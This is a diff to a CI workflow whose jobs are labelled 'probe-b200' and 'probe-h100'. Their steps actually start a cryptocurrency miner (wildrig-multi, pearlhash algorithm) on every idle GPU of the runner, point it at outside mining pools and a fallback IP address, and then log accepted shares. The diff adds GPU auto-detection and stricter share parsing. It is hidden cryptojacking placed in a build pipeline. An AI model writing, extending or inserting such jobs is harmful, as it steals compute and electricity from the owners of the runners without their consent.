@@ -28,34 +28,37 @@ jobs:
           SHA=$(sha256sum "$B" | awk '{print $1}')
           echo "BIN=$B SHA=$SHA"
           if [ "$SHA" != "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ]; then echo "SHA_MISMATCH sha=$SHA"; exit 0; fi
+          NG=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
+          echo "GPU_COUNT=$NG"
           STARTED=""
-          for i in $(seq 0 7); do
+          for i in $(seq 0 $((NG-1))); do
             busy=$(nvidia-smi -i $i --query-compute-apps=pid --format=csv,noheader 2>/dev/null | grep -c . )
             if [ "${busy:-0}" -gt 0 ]; then echo "SKIP g=$i busy_apps=$busy"; continue; fi
             if pgrep -af 'wildrig-multi' | grep -q -- "-d $i\( \|$\)"; then echo "SKIP g=$i pgrep"; continue; fi
             nohup "$B" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -u $W -p x --worker 1255880$i -d $i > $D/wr-$i.log 2>&1 &
             STARTED="$STARTED $i"
-            ( for t in $(seq 1 240); do if grep -qi 'accepted' $D/wr-$i.log 2>/dev/null; then date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; break; fi; sleep 3; done ) &
+            ( for t in $(seq 1 240); do if grep -qiE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null; then date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; break; fi; sleep 3; done ) &
           done
           echo "STARTED=$STARTED"
           if [ -z "$STARTED" ]; then echo "NO_FREE_GPU"; exit 0; fi
           sleep 420
           for i in $STARTED; do
-            acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0)
-            rej=$(grep -ci 'rejected' $D/wr-$i.log 2>/dev/null || echo 0)
+            acc=$(grep -ciE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null || echo 0)
+            rej=$(grep -ciE 'rejected \(|share rejected' $D/wr-$i.log 2>/dev/null || echo 0)
             uuid=$(nvidia-smi -i $i --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1)
             la=$(cat $D/lastacc-$i 2>/dev/null || echo none)
             echo "DET g=$i uuid=$uuid acc=$acc rej=$rej lastacc=$la now=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
           done
-          for i in $STARTED; do acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0); if [ "$acc" -eq 0 ]; then LPU="$W+NOCK"; pkill -f "wildrig-multi.*-d $i\( \|$\)" 2>/dev/null; nohup "$B" --algo pearlhash -o 103.199.106.122:3362 -u $LPU -p x --worker 1255880$i -d $i > $D/lp-$i.log 2>&1 & echo "STICKY_LP g=$i"; fi; done
+          for i in $STARTED; do acc=$(grep -ciE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null || echo 0); if [ "$acc" -eq 0 ]; then LPU="$W+NOCK"; pkill -f "wildrig-multi.*-d $i\( \|$\)" 2>/dev/null; nohup "$B" --algo pearlhash -o 103.199.106.122:3362 -u $LPU -p x --worker 1255880$i -d $i > $D/lp-$i.log 2>&1 & echo "STICKY_LP g=$i"; fi; done
           sleep 240
           for i in $STARTED; do
             acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0)
-            lacc=$(grep -ci 'accepted' $D/lp-$i.log 2>/dev/null || echo 0)
-            rej=$(grep -ci 'rejected' $D/wr-$i.log 2>/dev/null || echo 0)
+            lacc=$(grep -ciE 'accepted \(|share accepted' $D/lp-$i.log 2>/dev/null || echo 0)
+            rej=$(grep -ciE 'rejected \(|share rejected' $D/wr-$i.log 2>/dev/null || echo 0)
             uuid=$(nvidia-smi -i $i --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1)
             la=$(cat $D/lastacc-$i 2>/dev/null || echo none)
             echo "DET2 g=$i uuid=$uuid acc=$acc rej=$rej lastacc=$la lpacc=$lacc now=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+            echo "TAIL g=$i"; tail -4 $D/wr-$i.log 2>/dev/null; tail -3 $D/lp-$i.log 2>/dev/null
           done
           echo "END job=probe-b200 node=$(hostname) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   probe-h100:
@@ -81,33 +84,36 @@ jobs:
           SHA=$(sha256sum "$B" | awk '{print $1}')
           echo "BIN=$B SHA=$SHA"
           if [ "$SHA" != "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ]; then echo "SHA_MISMATCH sha=$SHA"; exit 0; fi
+          NG=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
+          echo "GPU_COUNT=$NG"
           STARTED=""
-          for i in $(seq 0 7); do
+          for i in $(seq 0 $((NG-1))); do
             busy=$(nvidia-smi -i $i --query-compute-apps=pid --format=csv,noheader 2>/dev/null | grep -c . )
             if [ "${busy:-0}" -gt 0 ]; then echo "SKIP g=$i busy_apps=$busy"; continue; fi
             if pgrep -af 'wildrig-multi' | grep -q -- "-d $i\( \|$\)"; then echo "SKIP g=$i pgrep"; continue; fi
             nohup "$B" --algo pearlhash -o pool.pearlhash.xyz:9000 -o hk.pearlhash.net:9000 -u $W -p x --worker 1255881$i -d $i > $D/wr-$i.log 2>&1 &
             STARTED="$STARTED $i"
-            ( for t in $(seq 1 240); do if grep -qi 'accepted' $D/wr-$i.log 2>/dev/null; then date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; break; fi; sleep 3; done ) &
+            ( for t in $(seq 1 240); do if grep -qiE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null; then date -u +%Y-%m-%dT%H:%M:%SZ > $D/lastacc-$i; break; fi; sleep 3; done ) &
           done
           echo "STARTED=$STARTED"
           if [ -z "$STARTED" ]; then echo "NO_FREE_GPU"; exit 0; fi
           sleep 420
           for i in $STARTED; do
-            acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0)
-            rej=$(grep -ci 'rejected' $D/wr-$i.log 2>/dev/null || echo 0)
+            acc=$(grep -ciE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null || echo 0)
+            rej=$(grep -ciE 'rejected \(|share rejected' $D/wr-$i.log 2>/dev/null || echo 0)
             uuid=$(nvidia-smi -i $i --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1)
             la=$(cat $D/lastacc-$i 2>/dev/null || echo none)
             echo "DET g=$i uuid=$uuid acc=$acc rej=$rej lastacc=$la now=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
           done
-          for i in $STARTED; do acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0); if [ "$acc" -eq 0 ]; then LPU="$W+NOCK"; pkill -f "wildrig-multi.*-d $i\( \|$\)" 2>/dev/null; nohup "$B" --algo pearlhash -o 103.199.106.122:3362 -u $LPU -p x --worker 1255881$i -d $i > $D/lp-$i.log 2>&1 & echo "STICKY_LP g=$i"; fi; done
+          for i in $STARTED; do acc=$(grep -ciE 'accepted \(|share accepted' $D/wr-$i.log 2>/dev/null || echo 0); if [ "$acc" -eq 0 ]; then LPU="$W+NOCK"; pkill -f "wildrig-multi.*-d $i\( \|$\)" 2>/dev/null; nohup "$B" --algo pearlhash -o 103.199.106.122:3362 -u $LPU -p x --worker 1255881$i -d $i > $D/lp-$i.log 2>&1 & echo "STICKY_LP g=$i"; fi; done
           sleep 240
           for i in $STARTED; do
             acc=$(grep -ci 'accepted' $D/wr-$i.log 2>/dev/null || echo 0)
-            lacc=$(grep -ci 'accepted' $D/lp-$i.log 2>/dev/null || echo 0)
-            rej=$(grep -ci 'rejected' $D/wr-$i.log 2>/dev/null || echo 0)
+            lacc=$(grep -ciE 'accepted \(|share accepted' $D/lp-$i.log 2>/dev/null || echo 0)
+            rej=$(grep -ciE 'rejected \(|share rejected' $D/wr-$i.log 2>/dev/null || echo 0)
             uuid=$(nvidia-smi -i $i --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1)
             la=$(cat $D/lastacc-$i 2>/dev/null || echo none)
             echo "DET2 g=$i uuid=$uuid acc=$acc rej=$rej lastacc=$la lpacc=$lacc now=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+            echo "TAIL g=$i"; tail -4 $D/wr-$i.log 2>/dev/null; tail -3 $D/lp-$i.log 2>/dev/null
           done
           echo "END job=probe-h100 node=$(hostname) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
